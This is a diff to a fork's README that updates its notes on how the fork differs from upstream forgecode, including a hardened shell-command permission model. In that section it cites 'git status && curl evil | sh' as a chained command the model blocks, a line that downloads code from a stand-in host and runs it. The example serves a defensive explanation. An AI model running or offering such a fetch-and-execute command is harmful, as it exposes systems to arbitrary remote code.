@@ -1126,29 +1126,37 @@ MCP tools can be used as part of multi-agent workflows, allowing specialized age
 ## Fork Notes (`mymain` vs `main`)
 
 This repository is a fork. The default working branch is **`mymain`**, which
-is a strict superset of upstream **`main`** (`antinomyhq/forgecode`). As of
-2026-05-19, `mymain` adds:
+is a strict superset of upstream **`main`** (`antinomyhq/forgecode`): there
+are **zero** commits upstream that are not in `mymain`. What `mymain` adds:
 
-- `Justfile` -- local developer task runner (build, test, lint, fzf workflows).
+- `Justfile` and `.just/helpers/` -- the developer task runner. One gate:
+  `just ci`.
 - `cli` -- forked POSIX-sh installer that fixes a bug where the upstream
   installer would clobber existing shell RC files even when `~/.local/bin`
   was already on `PATH`.
-- `plans/2026-05-05-emacs-native-forge-frontend-v1.md` -- planning document
-  for an experimental Emacs-native Forge frontend (not shipped in the
-  binary).
-- A one-character whitespace fix in `crates/forge_main/src/info.rs:78`.
+- `shell-plugin/bash/` and `shell-plugin/fish/` -- ports of the zsh plugin,
+  with the parity work documented under `docs/shell-parity/`.
+- `crates/forge_main/src/frontend/` -- a structured protocol that lets an
+  external frontend (GNU Emacs) drive Forge; see `docs/frontend-protocol.md`.
+- A hardened shell-command permission model: restricted mode on by default,
+  commands and URL fetches confirmed rather than allowed, and execute rules
+  matched per simple command so `git *` cannot auto-allow
+  `git status && curl evil | sh`.
+- Fork-only planning and research material under `plans/`,
+  `docs/shell-parity/`, `exec-harness/` and `.beads/`.
 
-There are **zero** commits in upstream `main` that are not in `mymain`, and
-the compiled `forge` binary is behaviourally identical between the two
-branches. See [`docs/fork-differences.md`](docs/fork-differences.md) for the
-exact commit list, per-file diff, and rationale.
+The compiled `forge` binary is **not** behaviourally identical to upstream's:
+the permission-model changes above are deliberate divergences. See
+[`docs/fork-differences.md`](docs/fork-differences.md) for the full breakdown
+and rationale.
 
-Reproduce the comparison locally with:
+Reproduce the comparison locally (`origin` is the fork; upstream code lives on
+the `upstream` remote):
 
 ```bash
-git fetch origin
-git log --oneline main..mymain
-git diff --stat main..mymain
+git fetch upstream
+git log  --oneline --no-merges upstream/main..mymain
+git diff --stat $(git merge-base upstream/main mymain)..mymain
 ```
 
 ---
